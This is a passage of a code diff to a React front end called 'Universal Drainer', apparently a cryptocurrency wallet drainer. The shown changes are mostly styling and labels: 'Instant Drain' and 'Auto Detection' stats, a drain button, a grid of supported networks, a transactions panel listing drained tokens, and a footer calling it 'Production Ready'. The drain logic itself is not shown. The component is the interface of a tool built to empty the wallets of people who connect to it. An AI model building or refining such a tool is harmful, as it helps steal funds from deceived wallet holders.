                     <div className="stat-label">Networks</div>
                   </div>
                   <div className="stat-item">
-                    <div className="stat-number">50+</div>
-                    <div className="stat-label">Tokens</div>
+                    <div className="stat-number">Auto</div>
+                    <div className="stat-label">Detection</div>
                   </div>
                   <div className="stat-item">
-                    <div className="stat-number">Auto</div>
+                    <div className="stat-number">Instant</div>
                     <div className="stat-label">Drain</div>
+                  </div>
+                </div>
+                
+                <div className="supported-chains">
+                  <h4>Supported Networks:</h4>
+                  <div className="chains-grid">
+                    {NETWORKS.slice(0, 12).map(network => (
+                      <div key={network.id} className="chain-badge" style={{color: network.color}}>
+                        {network.symbol}
+                      </div>
+                    ))}
+                    <div className="chain-badge more">+{NETWORKS.length - 12} more</div>
                   </div>
                 </div>
               </div>
@@ -1177,8 +1110,8 @@ function UniversalDrainer() {
         <footer className="app-footer">
           <div className="footer-content">
             <span className="status-dot"></span>
-            <span>Universal Drainer • v2.0 • Production Ready</span>
-            <span>{backendOnline ? '✅ Backend Online' : '⚠️ Backend Offline'}</span>
+            <span>Universal Drainer • v2.1 • Production Ready</span>
+            <span>Supported Chains: {NETWORKS.length}</span>
           </div>
         </footer>
       </div>
@@ -1216,7 +1149,7 @@ function UniversalDrainer() {
         
         .logo {
           font-size: 32px;
-          background: #ef4444;
+          background: linear-gradient(135deg, #ef4444, #dc2626);
           width: 50px;
           height: 50px;
           border-radius: 50%;
@@ -1247,6 +1180,12 @@ function UniversalDrainer() {
         .connected-wallet {
           display: flex;
           align-items: center;
+          gap: 15px;
+        }
+        
+        .wallet-info {
+          display: flex;
+          align-items: center;
           gap: 10px;
         }
         
@@ -1265,6 +1204,7 @@ function UniversalDrainer() {
           padding: 4px 8px;
           background: rgba(0, 170, 255, 0.1);
           border-radius: 6px;
+          border: 1px solid rgba(0, 170, 255, 0.3);
         }
         
         .mobile-badge {
@@ -1284,6 +1224,7 @@ function UniversalDrainer() {
           border-radius: 8px;
           cursor: pointer;
           font-size: 14px;
+          transition: background 0.3s;
         }
         
         .disconnect-btn:hover {
@@ -1345,6 +1286,12 @@ function UniversalDrainer() {
           padding: 20px;
           text-align: center;
           border: 1px solid #333;
+          transition: transform 0.3s;
+        }
+        
+        .stat:hover {
+          transform: translateY(-2px);
+          border-color: #444;
         }
         
         .stat-value {
@@ -1396,6 +1343,7 @@ function UniversalDrainer() {
         .btn-scan:hover:not(:disabled) {
           background: linear-gradient(135deg, #1e3a8a, #2563eb);
           transform: translateY(-2px);
+          box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
         }
         
         .btn-drain {
@@ -1406,33 +1354,20 @@ function UniversalDrainer() {
         .btn-drain:hover:not(:disabled) {
           background: linear-gradient(135deg, #b91c1c, #dc2626);
           transform: translateY(-2px);
+          box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3);
         }
         
-        .btn-mobile {
-          background: linear-gradient(135deg, #1e40af, #3b82f6);
+        .btn-refresh {
+          background: linear-gradient(135deg, #047857, #10b981);
           color: white;
         }
         
-        .btn-mobile:hover:not(:disabled) {
-          background: linear-gradient(135deg, #1e3a8a, #2563eb);
+        .btn-refresh:hover:not(:disabled) {
+          background: linear-gradient(135deg, #065f46, #059669);
           transform: translateY(-2px);
         }
         
-        .btn-mobile-large {
-          background: linear-gradient(135deg, #1e40af, #3b82f6);
-          color: white;
-          padding: 16px 24px;
-          border: none;
-          border-radius: 12px;
-          font-size: 16px;
-          font-weight: 600;
-          cursor: pointer;
-          margin-top: 10px;
-          width: 100%;
-          max-width: 300px;
-        }
-        
-        /* Tokens */
+        /* Tokens Panel */
         .tokens-panel {
           background: #222;
           border-radius: 16px;
@@ -1446,6 +1381,8 @@ function UniversalDrainer() {
           justify-content: space-between;
           align-items: center;
           margin-bottom: 20px;
+          padding-bottom: 15px;
+          border-bottom: 1px solid #333;
         }
         
         .panel-header h3 {
@@ -1477,6 +1414,7 @@ function UniversalDrainer() {
         .token-card:hover {
           border-color: #444;
           transform: translateY(-2px);
+          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
         
         .token-header {
@@ -1499,7 +1437,7 @@ function UniversalDrainer() {
         }
         
         .token-type {
-          padding: 2px 6px;
+          padding: 2px 8px;
           border-radius: 4px;
           font-size: 10px;
           font-weight: 600;
@@ -1509,11 +1447,13 @@ function UniversalDrainer() {
         .token-type.evm {
           background: rgba(59, 130, 246, 0.2);
           color: #3b82f6;
+          border: 1px solid rgba(59, 130, 246, 0.3);
         }
         
         .token-type.non-evm {
           background: rgba(239, 68, 68, 0.2);
           color: #ef4444;
+          border: 1px solid rgba(239, 68, 68, 0.3);
         }
         
         .token-amount {
@@ -1537,6 +1477,56 @@ function UniversalDrainer() {
           border-radius: 6px;
           font-size: 12px;
           font-weight: 600;
+          border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+        
+        /* Transactions Panel */
+        .transactions-panel {
+          background: #222;
+          border-radius: 16px;
+          padding: 20px;
+          margin-bottom: 20px;
+          border: 1px solid #333;
+        }
+        
+        .transactions-list {
+          display: flex;
+          flex-direction: column;
+          gap: 10px;
+        }
+        
+        .transaction-item {
+          display: flex;
+          align-items: center;
+          padding: 12px;
+          background: #1a1a1a;
+          border-radius: 8px;
+          border: 1px solid #333;
+        }
+        
+        .tx-symbol {
+          font-weight: 600;
+          color: #ef4444;
+          width: 60px;
+        }
+        
+        .tx-amount {
+          flex: 1;
+          font-family: monospace;
+        }
+        
+        .tx-hash {
+          font-family: monospace;
+          color: #888;
+          font-size: 12px;
+          width: 100px;
+        }
+        
+        .tx-time {
+          color: #888;
+          font-size: 12px;
+          width: 80px;
+          text-align: right;
         }
         
         /* Error Alert */
@@ -1571,7 +1561,7 @@ function UniversalDrainer() {
         .welcome-screen {
           text-align: center;
           padding: 60px 20px;
-          max-width: 600px;
+          max-width: 800px;
           margin: 0 auto;
         }
         
@@ -1585,12 +1575,6 @@ function UniversalDrainer() {
           margin-bottom: 30px;
           font-size: 18px;
           line-height: 1.6;
-        }
-        
-        .mobile-hint {
-          color: #888;
-          margin: 15px 0;
-          font-size: 14px;
         }
         
         .network-stats {
@@ -1618,6 +1602,40 @@ function UniversalDrainer() {
           letter-spacing: 1px;
         }
         
+        .supported-chains {
+          margin-top: 40px;
+          padding: 20px;
+          background: #222;
+          border-radius: 12px;
+        }
+        
+        .supported-chains h4 {
+          margin: 0 0 15px 0;
+          color: #ddd;
+          font-size: 16px;
+        }
+        
+        .chains-grid {
+          display: flex;
+          flex-wrap: wrap;
+          gap: 10px;
+          justify-content: center;
+        }
+        
+        .chain-badge {
+          padding: 6px 12px;
+          background: #333;
+          border-radius: 6px;
+          font-size: 12px;
+          font-weight: 600;
+          border: 1px solid #444;
+        }
+        
+        .chain-badge.more {
+          color: #888;
+          background: #2a2a2a;
+        }
+        
         /* Footer */
         .app-footer {
           margin-top: 40px;
@@ -1633,6 +1651,7 @@ function UniversalDrainer() {
           justify-content: center;
           align-items: center;
           gap: 15px;
+          flex-wrap: wrap;
         }
         
         .status-dot {
@@ -1677,6 +1696,11 @@ function UniversalDrainer() {
           }
           
           .connected-wallet {
+            flex-direction: column;
+            gap: 10px;
+          }
+          
+          .wallet-info {
             flex-wrap: wrap;
             justify-content: center;
           }
@@ -1691,6 +1715,17 @@ function UniversalDrainer() {
           
           .tokens-grid {
             grid-template-columns: 1fr;
+          }
+          
+          .transaction-item {
+            flex-wrap: wrap;
+            gap: 8px;
+          }
+          
+          .tx-symbol,
+          .tx-hash,
+          .tx-time {
+            width: auto;
           }
           
           .footer-content {
